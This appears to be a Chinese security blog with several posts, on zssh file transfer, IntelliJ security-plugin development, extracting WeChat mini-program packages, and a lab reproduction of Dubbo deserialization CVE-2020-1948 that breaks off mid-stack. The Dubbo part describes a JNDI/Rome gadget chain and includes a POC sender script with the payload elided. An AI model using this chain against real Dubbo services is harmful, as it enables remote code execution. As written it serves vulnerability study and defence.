          <p>遇到了需要跨堡垒机进行文件传输的情况，很多人推荐使用securecrt，securecrt十分强大，但是奈何囊中羞涩，于是乎使用其他工具进行，这里使用zssh进行。</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>使用brew install zssh安装，遇到了个403问题，临时更换了清华源后解决，Linux可以用apt-get安装。</p>
<p><img src="/images/210918/Image%20.png" alt=""></p>
<h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p>只是简单地从ssh登录改为zssh登录就可以了，没有什么区别，直接zssh user@server登录即可。我这里登录后再从堡垒机连接到对应的服务器。</p>
<h3 id="传输"><a href="#传输" class="headerlink" title="传输"></a>传输</h3><h3 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h3><p>在需要传输的文件下使用快捷键调出zssh（我这里是control+@，可能有所不同），使用sz命令进行文件上传。</p>
<p><img src="/images/210918/Image%20%5B1%5D.png" alt=""></p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>sz 上传文件，然后呼出zssh，再使用rz接收就行了，可能会失败。使用 rz -bye成功率较高，-b是字节传输，-e是检查编码对所有控制字符转译，-y暂时不清楚。</p>
<p><img src="/images/210918/Image%20%5B2%5D.png" alt=""></p>
<p><img src="/images/210918/Image%20%5B3%5D.png" alt=""></p>
<h3 id="呱"><a href="#呱" class="headerlink" title="呱"></a>呱</h3><p>zssh就是使用了sz，rz进行传输但是不需要进行配置，在便捷性上更上一层。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/08/06/idea%E6%8F%92%E4%BB%B6%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%A1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="0xSky">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="自动笔记生成器">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/06/idea%E6%8F%92%E4%BB%B6%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%A1/" class="post-title-link" itemprop="url">idea插件简单学习小计</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-08-06 17:19:56 / 修改时间：17:40:46" itemprop="dateCreated datePublished" datetime="2021-08-06T17:19:56+08:00">2021-08-06</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>由于希望在陌陌的idea安全插件上进行二开，学习idea插件开发，遂有以下记录。吐槽下jetBrians没有什么API说明文档，了解功能基本靠读名字、看已有插件与调试。</p>
<h6 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h6><p>配置idea，网上前辈提到最好使用社区版进行开发，社区版开源利于调试，遂下载idea 2020.3社区版。<br>设置JDK</p>
<p><img src="/images/210806/idea_plugin/Image%20%5B0%5D.png" alt=""></p>
<p>2020版idea使用的是JDK11所以添加JDK11，再将当前社区版IDE导入并下载对应版本的源代码（gayhub）导入</p>
<p><img src="/images/210806/idea_plugin/Image%20%5B1%5D.png" alt=""></p>
<p>搭建好DevKit环境后（官方的名字）按照网上的教程写了个action，不过遇到了jvm相关的错误。<br>由于陌陌的项目是的是官方的另外一种gradle构建方式，于是转而尝试这种方式。<br>在拉取依赖时频繁报错，这里可以切换maven镜像的地址，参考gradle文档：<a href="https://docs.gradle.org/current/userguide/declaring_repositories.html#sec:case-for-maven-local，直接使用本地setting.xml。" target="_blank" rel="noopener">https://docs.gradle.org/current/userguide/declaring_repositories.html#sec:case-for-maven-local，直接使用本地setting.xml。</a><br>官方文档中说明gradle环境所需的两个插件是默认启用的，所以不需要额外下载，建议直接安装官网<a href="https://plugins.jetbrains.com/docs/intellij/gradle-build-system.html说明进行操作，网上不少文章有些偏差。这里注意在配置时最好使用中央maven仓库并选择网络较好的场所（都懂）。" target="_blank" rel="noopener">https://plugins.jetbrains.com/docs/intellij/gradle-build-system.html说明进行操作，网上不少文章有些偏差。这里注意在配置时最好使用中央maven仓库并选择网络较好的场所（都懂）。</a></p>
<h6 id="现有插件"><a href="#现有插件" class="headerlink" title="现有插件"></a>现有插件</h6><p>由于官方文档对于PSI没有非常详细的说明，所以想要实现功能基本只能通过看官方示例代码与已有的开源插件代码来学习，这里就简单记录一下在陌陌插件中会用到的一些组件、方法以及接口等。</p>
<p>mybatis配置型检测插件 MybatisXmlSQLi：<br>此类继承自MomoBaseLocalInspectionTool字面意思基础本地检测工具，父类又继承于jetbrains的AbstractBaseJavaLocalInspectionTool其中定义了checkMethod、checkClass等方法。<br>实现检测的方法是buildVisitor，这是定义于com.intellij.codeInspection.LocalInspectionTool中的方法，在定义处的描述表明重写另外一个重载方法就可以实现自己的检查逻辑了。此方法返回了一个 PsiElementVisitor对象。</p>
<p><img src="/images/210806/idea_plugin/Image%20%5B2%5D.png" alt=""></p>
<p><img src="/images/210806/idea_plugin/Image%20%5B3%5D.png" alt=""></p>
<p>插件在重写buildVisitor后返回了一个 XmlElementVisitor对象，从命名就能得知这是一个针对XML的元素访问器，重写后获得一个XmlText对象，并检测了当前位置是否是最外部标签且父标签是否是sql或mapper，满足条件则跳出检测逻辑，这样做是因为在mapper标签下需要创建如select、insert等标签进行语句定义所以直接在mapper下的语句不需要检测。然后通过XmlText获取一个 XmlDocument并检测是否引用了mybatis的DTD文件，通过两个检测步骤确定了输入内容是需要检测的mybatis配置文件。<br>详细的检测逻辑暂略，可参考源代码，这里主要是通过对插件学习了解jetbrains所提供的一些接口功能等。<br>在确认被检测字段是一个问题后，registerProblem方法的第四个参数传入了一个LocalQuickFix（可以是多个），提供修复，此处的MybatisXmlSQLiQuickFix通过实现LocalQuickFix接口中的applyFix（定义于QuickFix<D>中）实现修复逻辑，具体修复逻辑略过，主要是根据几种情况（where in、like以及其他）构造替换代码。当然这里的修复方法对于外部传参的order by不能有效地修复，这种依然需要开发进行针对性的修复，包括其他复杂的传参查询修复。</p>
<p><img src="/images/210806/idea_plugin/Image%20%5B4%5D.png" alt=""></p>
<p><img src="/images/210806/idea_plugin/Image%20%5B5%5D.png" alt=""></p>
<p><img src="/images/210806/idea_plugin/Image%20%5B6%5D.png" alt=""></p>
<p><strong>硬编码IP检测插件 HardcodedIp：</strong><br>主要是检测Java文件中的硬编码IP，所以在此处buildVisitor中实现的是JavaElementVisitor，在对象中重写了visitLiteralExpression方法，从字面上理解指字符型的表达式，具体可以通过调试来观察。在visitLiteralExpression中下个断点，使用gradle插件runIde启动调试模式，写一个Java文件观察是否触发检测，在下图中的赋值只有第二种引用赋值不会触发visitLiteralExpression方法。</p>
<p><img src="/images/210806/idea_plugin/Image%20%5B7%5D.png" alt=""></p>
<p>而插件限制了只有JavaTokenType.STRING_LITERAL才会触发检测，所以最终只有第一种字符表达式会触发检测逻辑。后续检测字符是否是IP逻辑略过，插件标明了检测逻辑来源。</p>
<p><strong>硬编码凭证检测插件 HardcodedCredentials：</strong><br>与IP检测一样实现JavaElementVisitor，但重写方法有所不同，这个插件重写了visitLocalVariable，visitAssignmentExpression，visitField，visitMethodCallExpression几个方法，检测思路主要是针对变量名称是否命名为password、token等以及在赋值时有没有password=这种字符。<br>visitLocalVariable：<br>如图所示，除了类下的Field内容其他变量都会触发动作，触发遵循作用域，在某个作用域发生改变就检测此作用域与子域，例如在method中修改变量不会触发main函数中的检测。</p>
<p><img src="/images/210806/idea_plugin/Image%20%5B8%5D.png" alt=""></p>
<p>修改longIP，触发对main函数中内容的检测</p>
<p><img src="/images/210806/idea_plugin/Image%20%5B9%5D.png" alt=""></p>
<p><img src="/images/210806/idea_plugin/Image%20%5B10%5D.png" alt=""></p>
<p><img src="/images/210806/idea_plugin/Image%20%5B11%5D.png" alt=""></p>
<p><img src="/images/210806/idea_plugin/Image%20%5B12%5D.png" alt=""></p>
<p><img src="/images/210806/idea_plugin/Image%20%5B13%5D.png" alt=""></p>
<p><img src="/images/210806/idea_plugin/Image%20%5B14%5D.png" alt=""></p>
<p>visitAssignmentExpression：<br>在声明型进行赋值时触发</p>
<p><img src="/images/210806/idea_plugin/Image%20%5B15%5D.png" alt=""></p>
<p>此处还判断了是否是引用赋值</p>
<p><img src="/images/210806/idea_plugin/Image%20%5B16%5D.png" alt=""></p>
<p>visitField：<br>修改field内容时触发</p>
<p><img src="/images/210806/idea_plugin/Image%20%5B17%5D.png" alt=""></p>
<p>visitMethodCallExpression：<br>此方法主要是为了使用函数来赋值的情况，例如以下两种情况，都会触发，在工程化操作数据时非常常见</p>
<p><img src="/images/210806/idea_plugin/Image%20%5B18%5D.png" alt=""></p>
<p>XXE检测插件XxeInspector：<br>此处的检测主要分为两种visitMethodCallExpression与visitNewExpression这是因为常见的XXE解析三方包在获取解析对象时主要是例如：<br>DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();<br>SAXBuilder builder = new SAXBuilder();<br>这两种形式，visitNewExpression在使用new获取对象时触发；visitMethodCallExpression则在使用类加载机制，利用方法调用创建时触发。<br>在检测插件中对10中情况进行了检测，检测源信息来自于owasp的XXE Prevention Cheat Sheet。</p>
<p><img src="/images/210806/idea_plugin/Image%20%5B19%5D.png" alt=""></p>
<p>顺手记下怎么修改插件，个人觉得找已经实现的或通过对象结构之间的关系去寻找jetbrains实现的方法即可，比如下面这个。在检测硬编码凭证的插件中我没有找到对类似于String str = new String(“password”)这类方式的校验，在visitMethodCallExpression中只检测了使用Hashtable以及JDBC连接两种情况，所以将这个检测也加入进去。<br>首先在现有的逻辑中，上述的声明赋值会进入visitAssignmentExpression与visitMethodCallExpression两个重写了的检测逻辑中，第二个前面说过了不会生效，而在visitAssignmentExpression由于检测逻辑判断了表达式是否是PsiLiteralExpression类型，需要检测的内容是PsiNewExpressionImpl也就是PsiNewExpression类型，所以会被忽略。</p>
<p><img src="/images/210806/idea_plugin/Image%20%5B20%5D.png" alt=""></p>
<p>所以在此外进行额外匹配</p>
<p><img src="/images/210806/idea_plugin/Image%20%5B21%5D.png" alt=""></p>
<p>下一步则是要对赋值的内容进行复杂度判断，辨别内容是否想是一个密码，复杂度判断逻辑沿用原有插件的逻辑，这里需要做的就是获取字符串内容。先说现有方法，已实现的方法直接使用ExpressionUtils.getLiteral(PsiExpression expression)获取，尝试使用，结果是null，此路不通。</p>
<p><img src="/images/210806/idea_plugin/Image%20%5B22%5D.png" alt=""></p>
<p>换一个思路，找一找PsiNewExpressionImpl实现的方法中是否存在获取参数的方法，存在一个getArgumentList方法，从命名上来看就是获取参数列表</p>
<p><img src="/images/210806/idea_plugin/Image%20%5B23%5D.png" alt=""></p>
<p><img src="/images/210806/idea_plugin/Image%20%5B24%5D.png" alt=""></p>
<p>我们查看具体返回的类型，这里我选择直接在调试时输入代码查看并结合源代码，更容易理解，其中getExpressions()方法从字面上来看是获取表达式的方法，直接看调试。</p>
<p><img src="/images/210806/idea_plugin/Image%20%5B25%5D.png" alt=""></p>
<p><img src="/images/210806/idea_plugin/Image%20%5B26%5D.png" alt=""></p>
<p>显然已经找到想找的内容了，由于此处参数只会有一个所以直接取0号索引即可，完成剩下代码即可检测这个内容了。</p>
<p><img src="/images/210806/idea_plugin/Image%20%5B27%5D.png" alt=""></p>
<p><img src="/images/210806/idea_plugin/Image%20%5B28%5D.png" alt=""></p>
<p>通过以上的方法，我对原有的硬编码、mybatis配置检测插件进行了一些修改并把cobra里的几个检测规则也搬了进来，总的来说还是有些收获的。菜鸟的自我修养:)</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/07/20/PC%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8F%90%E5%8F%96%E5%AD%A6%E4%B9%A0%E9%9A%8F%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="0xSky">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="自动笔记生成器">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/20/PC%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8F%90%E5%8F%96%E5%AD%A6%E4%B9%A0%E9%9A%8F%E8%AE%B0/" class="post-title-link" itemprop="url">PC微信小程序提取学习随记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-07-20 14:20:47 / 修改时间：14:30:26" itemprop="dateCreated datePublished" datetime="2021-07-20T14:20:47+08:00">2021-07-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>简单记录下有关微信小程序的学习，这里不是指开发个小程序，是怎样获得小程序的源代码。了解微信小程序的人都知道小程序实际上是一个打包了的前端程序，可以理解为把Web网页打包放在微信上了，所以前端代码理论上是可以得到的。以前要得到前端小程序代码的基本套路是使用Root的安卓客户端找到小程序包反编译，这好吗，这不好，麻烦，现在Win上的微信客户端也支持操作小程序了，所以网上如法炮制，从Win客户端中获取小程序。学习学习。</p>
<p><img src="/images/210720/Image%20.png" alt=""></p>
<p>首先清空一下小程序缓存wxid目录下Applet文件夹，小程序以wx加编码（估计是hash之类的）命名，不易区分。打开小程序，多点击各种功能，确保资源全部加载。原贴中的wxapkg包在用户ID文件夹下，但我找到是直接在微信文件夹下，用户ID文件夹下是数据库文件，因为解密软件需要.net环境所以直接在win7虚机里面弄了，还发现win自己升级了20H2导致了HV和VM冲突升了个16才算完事。</p>
<p><img src="/images/210720/Image%20%5B1%5D.png" alt=""></p>
<p><img src="/images/210720/Image%20%5B2%5D.png" alt=""></p>
<p>之后用 wxappUnpacker解包就可以咯，环境配置在readme中都有就不赘述了</p>
<p><img src="/images/210720/Image%20%5B3%5D.png" alt=""></p>
<p><img src="/images/210720/Image%20%5B4%5D.png" alt=""></p>
<p>其实和使用Android提取是差不多的，这里主要就是避免了使用模拟器或真机的麻烦，提取小程序包更加地方便，方便从小程序中提取线索</p>
<p><img src="/images/210720/Image%20%5B5%5D.png" alt=""></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/23/dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88CVE-2020-1948%EF%BC%89%E5%8F%AF%E7%94%A8%E9%93%BE%E8%B7%AF%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="0xSky">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="自动笔记生成器">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/23/dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88CVE-2020-1948%EF%BC%89%E5%8F%AF%E7%94%A8%E9%93%BE%E8%B7%AF%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">dubbo反序列化（CVE-2020-1948）可用链路学习</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-23 20:24:33" itemprop="dateCreated datePublished" datetime="2021-03-23T20:24:33+08:00">2021-03-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-03-26 17:32:29" itemprop="dateModified" datetime="2021-03-26T17:32:29+08:00">2021-03-26</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>为什么会想写这样一篇文章呢，一方面是因为学习安全那么些时间一直没有写点东西，恰好最近在学习Java反序列化的相关知识，于是呢就想着记录一下自己学习的知识。还有一个原因是在学习dubbo两个反序列化漏洞的过程中（CVE-2019-17564、CVE-2020-1948），对于更加复杂的CVE-2020-1948没有找到实际可用的链路分析文章，都是分析了一个很难在实际中遇到的gadget（Rome），于是就萌生了自己学习一下实际可用的链路（毕竟难以利用的链路无法打动研发同事，狗头.jpg）。<br>之前在学习时写了三篇流水账，于是此文作为对此次学习的一个总结，梳理一下之前的三篇流水账。有关CVE-2019-17564比较简单，这里就不赘述了，可用直接看第一篇流水账。</p>
<h2 id="CVE-2020-1948基础复现"><a href="#CVE-2020-1948基础复现" class="headerlink" title="CVE-2020-1948基础复现"></a>CVE-2020-1948基础复现</h2><h3 id="第二个POC的复现"><a href="#第二个POC的复现" class="headerlink" title="第二个POC的复现"></a>第二个POC的复现</h3><p>我们首先按照漏洞原作者Ruilin师傅给官方的<a href="https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html" target="_blank" rel="noopener">报告</a>中的两个POC学习一下这个漏洞。<br>首先我们来看第二个POC，为什么是第二个呢，因为第二个POC是通过主动抛出错误时，调用这个错误的构造方法，构造方法接受一个参数时进行拼接从而触发参数对象重写的toString方法达到触发目的，与第一个反序列化POC有着较大的不同，而在dubbo的GitHub issue中争论得最激烈的就是这个toString方法，想了各种方法去修，实际上由于gadget（Rome）其实在一般的项目中并不常用着实有点跑偏了。但是作者在这个POC中的思路着实牛皮下面贴一下复现的过程。</p>
<p>复现时使用的是dubbo-spring-boot-project-0.1.0版本演示项目，目的是使用更多的dubbo版本进行测试，因为dubbo在捐赠给Apache后包名发生了变化，用其他演示项目修改起来非常麻烦。<br>在项目中引入作者的POC触发所需的gadget Rome依赖，同时因为这个漏洞是触发JNDI注入，所以再从GitHub拉一个现成的JNDI Server，这里我使用的是<a href="https://github.com/welk1n/JNDI-Injection-Exploit" target="_blank" rel="noopener">JNDI-Injection-Exploit</a>。有关RMI、JNDI、JRMP的相关知识我这里也不赘述了，网上的师傅们已经有非常详尽的解释了。</p>
<p><img src="/images/210222/dubbo/Image%20%5B18%5D.png" alt=""></p>
<p>启动演示项目与JNDI Server，这里需要注意为了方便实验，我使用的是JRE1.8_131。</p>
<p><img src="/images/210222/dubbo/Image%20%5B20%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B19%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B21%5D.png" alt=""></p>
<p>环境布置完毕后我们运行Ruilin师傅提交的POC，这里犯了个小错误，演示项目的dubbo端口是12345而不是20880。</p>
<p><img src="/images/210222/dubbo/Image%20%5B22%5D.png" alt=""></p>
<p>运行POC后弹出了我们想看到的计算器，JNDI Server也有输出记录（设置JNDI Server 计算器payload的过程我略过了，项目描述文件中有比较详细的描述）。</p>
<p><img src="/images/210222/dubbo/Image%20%5B26%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B27%5D.png" alt=""></p>
<h3 id="第二个POC的利用链路分析"><a href="#第二个POC的利用链路分析" class="headerlink" title="第二个POC的利用链路分析"></a>第二个POC的利用链路分析</h3><p>从上面师傅POC的代码我们可以看到，POC将带有ldap地址的<code>JdbcRowSetImpl</code>封装到<code>ToStringBean</code>中，作为参数对dubbo发起请求。了解了POC所做的事，接下来就进入IDE调试一下。<br>首先查看在payload触发时的错误堆栈。</p>
<p><img src="/images/210222/dubbo/Image%20%5B28%5D.png" alt=""></p>
<p>可以看到在堆栈中有多次<code>toString</code>调用，这里就是触发POC中封装ldap地址的位置，为了符合从外到内的习惯，我在堆栈中<code>DecodeHandler.received</code>处设下断点。<br>这里还有个小坑，如果不关闭IDEA的Enable ‘toString()’ object view选项，就会一直触发payload弹出计算器，因为IDEA为了方便查看会调用object 的toString来方便展示，这就让payload触发了，其实IDEA也是告诉了我们payload触发的位置（笑）。</p>
<p><img src="/images/210222/dubbo/Image%20%5B29%5D.png" alt=""></p>
<p>然后跟着堆栈的调用跟进，这里就是处理请求信息的流程就不过多地解释了，依照堆栈堆栈即可。</p>
<p><img src="/images/210222/dubbo/Image%20%5B30%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B31%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B32%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B33%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B34%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B35%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B38%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B39%5D.png" alt=""></p>
<p>之后再跟进时，在<code>getInvoker</code>方法中由于找不到service会抛出一个<code>RemotingException</code>，这就是在POC中指定一个不存在的service的用意，就是为了触发此处的异常抛出</p>
<p><img src="/images/210222/dubbo/Image%20%5B40%5D.png" alt=""></p>
<p>可以看到在<code>throw new RemotingException</code>时构造方法传参大量使用了加号去拼接对象，这会隐式调用对象的<code>toString</code>方法，要确定触发点也非常简单，在前面的步骤中我们关闭了自动<code>toString</code>，此时我们只要手动一个一个点击对象的<code>toString</code>就可以了（IDEA查看对象就是调用<code>toString</code>）。在点击<code>inv</code>对象时计算器弹出了，这就明确了，进入<code>inv</code>对象类源码。</p>
<p><img src="/images/210222/dubbo/Image%20%5B44%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B45%5D.png" alt=""></p>
<p><code>inv</code>是<code>DecodeableRpcInvocation</code>对象，但在<code>DecodeableRpcInvocation</code>中并没有重写<code>toString</code>，而在<code>DecodeableRpcInvocation</code>的父类<code>RpcInvocation</code>中重写了<code>toString</code>。</p>
<p><img src="/images/210222/dubbo/Image%20%5B47%5D.png" alt=""></p>
<p>而重写的<code>toString</code>方法中将<code>RpcInvocation</code>对象的<code>parameterTypes</code>、<code>arguments</code>、<code>attachements</code>都拼接了这最终导致了参数中的<code>ToStringBean</code>的<code>toString</code>方法被执行，而<code>ToStringBean</code>类则是被构造传入的JNDI ldap payload，到这里就完成了一次JNDI注入成功RCE。<br>这里简单补充一下Rome 1.7.0 中触发JDNI注入的位置，刚刚提到<code>ToStringBean</code>的<code>toString()</code>调用了<code>toString(prefix)</code>，此方法遍历所有<code>Method</code>并<code>invoke</code>调用。</p>
<p><img src="/images/210222/dubbo/Image%20%5B51%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B52%5D.png" alt=""></p>
<p>当<code>Method</code>是<code>getDatabaseMetaData</code>时，触发一个典型的JNDI注入。有关这种触发方式<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">BlackHat</a>议题有详细描述。</p>
<p><img src="/images/210222/dubbo/Image%20%5B53%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B54%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B55%5D.png" alt=""></p>
<h3 id="第一个POC的复现"><a href="#第一个POC的复现" class="headerlink" title="第一个POC的复现"></a>第一个POC的复现</h3><p>说完了第二个POC，我们来说第一个POC，之前说过之所以将第二个POC先说是因为第二个POC较为特殊，而第一个POC则与传统的反序列化漏洞更接近。</p>
<p>老规矩上来先看Ruilin师傅的POC。POC非常简洁，构造数据流，发送。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendEvilObjData</span><span class="params">(sock)</span>:</span> </span><br><span class="line">   payload=<span class="string">"这里是二进制payload数据"</span></span><br><span class="line">   sock.send(payload.decaode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(dip,dport)</span>:</span></span><br><span class="line">   sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">   server_addr = (dip, dport)</span><br><span class="line">   sock.connect(server_addr)</span><br><span class="line">   sendEvilObjData(sock)</span><br><span class="line"></span><br><span class="line">run(<span class="string">"127.0.0.1"</span>,<span class="number">12345</span>)</span><br></pre></td></tr></table></figure>

<p>为了能更好地理解，我们现在演示程序上操作一下，因为0.1.0版本的演示项目运行POC时spring会报错，所以这里我使用高版本spring的dubbo-spring-boot-project-2.7.3进行实验。POC的构造参考了D4ck师傅的<a href="https://www.anquanke.com/post/id/209251" target="_blank" rel="noopener">文章</a>。<br>首先和第二个POC一样我们声明JNDI ldap的地址，然后声明<code>ToStringBean</code>类将ldap地址传入，之后依次构造<code>EqualsBean</code>和<code>HashMap</code>将其组装起来，最后用消费者消费之前声明的service（声明service的过程这里就省略了，可以在官方文档和D4ck师傅的文章中查看）。</p>
<p><img src="/images/210222/dubbo/Image%20%5B58%5D.png" alt=""></p>
<p>然后和先前的验证步骤一样启动ldap服务，生产者与消费者demo即可看到payload触发。 </p>
<p><img src="/images/210222/dubbo/Image%20%5B59%5D.png" alt=""></p>
<p>之后来提取流量数据，打开强大的wireshark，由于项目是本地的所以直接监听回环地址，找到数据包并将其中的数据段复制出来因为是序列化后的对象所以其实数据包中的特征还是很明显的，比较好找，这里处理二进制数据我使用了VSCode的hexdump，当然直接找准位置复制也是可以的。</p>
<p><img src="/images/210222/dubbo/Image%20%5B60%5D.png" alt=""></p>
<p>然后将Ruilin师傅POC中py27的使用方法改为py37，发送POC，弹出计算器。</p>
<p><img src="/images/210222/dubbo/Image%20%5B61%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B62%5D.png" alt=""></p>
<p>这里需要说一下，可能是演示项目的问题，我遇到了版本号不匹配的问题，这会造成POC发送后触发的是前一种报错破解方式而非hessian2反序列化，我看到网上有不少文章将报错触发当成了hessian2反序列化触发，导致以为两个POC都是一个链路。</p>
<p><img src="/images/210222/dubbo/Image%20%5B63%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B64%5D.png" alt=""></p>
<h3 id="第一个POC-的利用链路分析"><a href="#第一个POC-的利用链路分析" class="headerlink" title="第一个POC 的利用链路分析"></a>第一个POC 的利用链路分析</h3><p>首先贴一下调用堆栈，从堆栈中我们可以清晰地看到我们组装的<code>ToStringBean</code>、<code>EqualsBean</code>、<code>HashMap</code>三个类，栈顶的<code>toString</code>方法就是第二个POC中的JNDI注入触发位置。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">toString:<span class="number">158</span>, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">toString:<span class="number">129</span>, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">beanHashCode:<span class="number">198</span>, EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hashCode:<span class="number">180</span>, EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hash:<span class="number">338</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">doReadMap:<span class="number">145</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readMap:<span class="number">126</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2703</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2278</span>, 